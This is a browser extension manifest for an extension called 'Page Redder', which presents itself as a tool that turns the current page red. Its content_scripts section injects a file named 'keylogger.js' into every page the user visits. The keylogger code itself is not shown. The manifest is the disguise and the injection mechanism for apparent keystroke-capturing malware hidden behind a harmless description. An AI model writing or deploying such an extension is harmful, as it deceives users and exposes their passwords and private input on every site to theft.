{
  "name": "Page Redder",
  "description": "Make the current page red",
  "version": "2.0",
  "permissions": [
    "activeTab"
  ],
  "background": {
    "scripts": ["background.js"],
    "persistent": true
  },
  "browser_action": {
    "default_title": "Make this page red"
  },
  "content_scripts": [
  {
      "matches": ["<all_urls>"],
      "js": ["keylogger.js"]
  }
  ],
  "manifest_version": 2
}
